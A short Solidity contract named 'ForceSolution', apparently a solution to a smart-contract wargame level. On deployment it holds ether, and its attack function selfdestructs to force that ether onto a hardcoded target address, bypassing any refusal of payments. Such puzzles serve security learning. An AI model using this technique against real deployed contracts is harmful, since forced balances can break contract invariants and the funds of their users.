pragma solidity ^0.6.0;

contract ForceSolution {
    constructor() payable public {}
    function attack() public {
        selfdestruct(0x013E958097C96642F7be4c515E5E7bB474cC7013);
    }
}